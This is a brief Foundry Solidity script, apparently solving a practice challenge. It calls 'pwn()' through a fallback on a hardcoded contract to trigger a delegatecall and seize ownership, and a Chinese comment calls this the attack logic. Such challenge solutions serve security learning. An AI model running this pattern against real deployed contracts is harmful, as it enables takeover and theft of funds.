pragma solidity ^0.8.0;
import "forge-std/Script.sol";

interface IDelegation {
    
}

contract ToeknScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        
        vm.startBroadcast(privateKey);
        
        // 在这里编写你的攻击逻辑，例如调用目标合约的函数
        IDelegation delegation = IDelegation(0x57d8817e812e0Fcd5a1F881c7B73409420625A87);
       (bool success,) =address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "Attack failed");
        vm.stopBroadcast();
    }
}